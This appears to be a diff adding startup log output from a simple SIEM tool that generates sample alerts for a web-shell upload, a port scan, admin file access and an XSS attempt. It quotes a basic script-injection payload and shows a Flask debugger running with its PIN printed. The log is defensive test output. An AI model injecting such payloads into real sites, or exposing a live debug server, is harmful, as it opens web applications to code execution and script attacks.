+2025-12-25 15:08:31,582 - SIEM-Tool - INFO - TIP model unavailable (missing dependencies): No module named 'tensorflow.python'
+2025-12-25 15:08:31,587 - SIEM-Tool - INFO - Starting Simple SIEM Tool...
+2025-12-25 15:08:31,588 - SIEM-Tool - INFO - Loaded 42 detection rules
+2025-12-25 15:08:31,594 - SIEM-Tool - WARNING - ALERT ALERT-000001: File Upload Attempt - File upload attempted: malicious.php
+2025-12-25 15:08:31,594 - SIEM-Tool - WARNING - ALERT ALERT-000002: Web Shell Upload - File upload attempted: malicious.php
+2025-12-25 15:08:31,595 - SIEM-Tool - WARNING - ALERT ALERT-000003: Port Scan Detection - Port scan detected from 203.0.113.10
+2025-12-25 15:08:31,596 - SIEM-Tool - WARNING - ALERT ALERT-000004: XSS Attempt - XSS attempt detected: <script>alert('xss')</script>
+2025-12-25 15:08:31,596 - SIEM-Tool - WARNING - ALERT ALERT-000005: Admin Access - Admin accessed sensitive configuration file
+2025-12-25 15:08:31,596 - SIEM-Tool - INFO - Generated 5 sample alerts
+2025-12-25 15:08:31,596 - SIEM-Tool - INFO - Server running on http://localhost:5000
+2025-12-25 15:08:31,605 - werkzeug - WARNING -  * Debugger is active!
+2025-12-25 15:08:31,620 - werkzeug - INFO -  * Debugger PIN: 535-873-472
